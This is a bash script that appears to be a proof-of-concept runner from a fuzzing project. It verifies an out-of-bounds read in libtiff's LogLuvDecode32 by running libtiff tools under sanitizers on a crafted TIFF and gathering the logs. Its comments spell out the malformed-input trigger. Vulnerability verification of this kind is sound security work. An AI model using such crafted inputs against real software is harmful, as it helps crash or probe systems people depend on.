#!/bin/bash
# PoC runner for VULN 003: LogLuvDecode32() OOB read
# libtiff/libtiff/tif_luv.c lines 310-314
# Trigger: StripByteCount=1, strip byte >= 0x80 -> run branch reads 2nd byte OOB

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/libtiff/libtiff_tif_luv_c"
TIFFSPLIT="/data/ylwang/non-textfuzz/target/libtiff/build_test/bin/tiffsplit"
TIFF2RGBA="/data/ylwang/non-textfuzz/target/libtiff/build_test/bin/tiff2rgba"
RESULT="${POC_DIR}/vuln_003_result.txt"

cd "${POC_DIR}"

# Clean up previous run artifacts
rm -f "${RESULT}" ./asan_003_split.log.* ./asan_003_rgba.log.* /tmp/tiffsplit_003_*

# Generate the PoC TIFF if not already present
if [ ! -f vuln_003.tif ]; then
    python3 "${POC_DIR}/vuln_003_gen.py"
fi

echo "=== VULN 003: LogLuvDecode32 OOB Read ===" > "${RESULT}"
echo "TIFF: ${POC_DIR}/vuln_003.tif" >> "${RESULT}"
echo "" >> "${RESULT}"

# --- Step 1: Run tiffsplit (required tool per constraint) ---
echo "=== Step 1: tiffsplit (raw strip copy - does not call decoder) ===" >> "${RESULT}"
ASAN_OPTIONS="abort_on_error=0:log_path=${POC_DIR}/asan_003_split.log:detect_stack_use_after_return=1" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0:log_path=${POC_DIR}/ubsan_003_split.log" \
  "${TIFFSPLIT}" vuln_003.tif /tmp/tiffsplit_003_ >> "${RESULT}" 2>&1 || true

# --- Step 2: tiff2rgba to confirm LogLuvDecode32 is triggered ---
echo "" >> "${RESULT}"
echo "=== Step 2: tiff2rgba (decode path verification - calls LogLuvDecode32) ===" >> "${RESULT}"
ASAN_OPTIONS="abort_on_error=0:log_path=${POC_DIR}/asan_003_rgba.log:detect_stack_use_after_return=1" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0:log_path=${POC_DIR}/ubsan_003_rgba.log" \
  "${TIFF2RGBA}" vuln_003.tif /tmp/out_vuln003.tif >> "${RESULT}" 2>&1 || true

echo "" >> "${RESULT}"
echo "=== ASAN/UBSAN Output ===" >> "${RESULT}"

found_error=0
for f in "${POC_DIR}"/asan_003_split.log.* "${POC_DIR}"/asan_003_rgba.log.* \
          "${POC_DIR}"/ubsan_003_split.log.* "${POC_DIR}"/ubsan_003_rgba.log.*; do
    if [ -f "$f" ]; then
        echo "--- ${f} ---" >> "${RESULT}"
        cat "$f" >> "${RESULT}"
        if grep -qE "AddressSanitizer|ERROR:|runtime error:|heap-buffer-overflow|stack-buffer-overflow|use-after|SEGV" "$f" 2>/dev/null; then
            found_error=1
        fi
    fi
done

if [ $found_error -eq 0 ]; then
    echo "(No ASAN/UBSAN errors detected)" >> "${RESULT}"
    echo "" >> "${RESULT}"
    echo "NOTE: The vulnerability is a logical OOB read (bp reads past tif_rawcc=1)." >> "${RESULT}"
    echo "ASAN does not catch it because TIFFroundup(1,1024) allocates 1024-byte buffer." >> "${RESULT}"
    echo "The 'Not enough data at row 0' message from tiff2rgba confirms LogLuvDecode32" >> "${RESULT}"
    echo "is triggered and reads past the valid 1-byte strip boundary." >> "${RESULT}"
fi

echo "" >> "${RESULT}"
echo "=== Done ===" >> "${RESULT}"

cat "${RESULT}"
